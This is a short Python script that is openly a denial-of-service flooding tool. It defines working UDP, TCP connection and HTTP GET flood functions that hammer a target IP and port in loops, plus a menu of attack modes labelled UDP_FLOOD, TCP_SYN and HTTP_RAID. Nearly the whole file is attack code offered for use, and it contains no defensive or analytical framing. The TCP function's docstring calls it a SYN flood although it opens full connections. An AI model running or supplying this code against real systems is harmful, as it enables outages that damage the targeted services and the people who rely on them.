import socket
import random
import time
from datetime import datetime

def udp_attack(target_ip, stop_flag, port=80):
    """Optimized UDP flood attack with socket reuse."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    data = random._urandom(2048)
    
    while not stop_flag.is_set():
        try:
            sock.sendto(data, (target_ip, port))
        except Exception as e:
            pass
        time.sleep(0.01)

def tcp_attack(target_ip, stop_flag, port=80):
    """TCP SYN flood with connection pooling."""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, port))
            sock.send(random._urandom(1024))
            sock.close()
        except Exception as e:
            pass
        time.sleep(0.01)

def http_attack(target_ip, stop_flag, port=80):
    """HTTP layer attack with proper headers."""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, port))
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            sock.send(request.encode())
            sock.close()
        except Exception as e:
            pass
        time.sleep(0.01)

def validate_ip(ip):
    """Validate IP address format."""
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

attack_modes = {
    "1": {"name": "UDP_FLOOD", "function": udp_attack},
    "2": {"name": "TCP_SYN", "function": tcp_attack},
    "3": {"name": "HTTP_RAID", "function": http_attack}
}
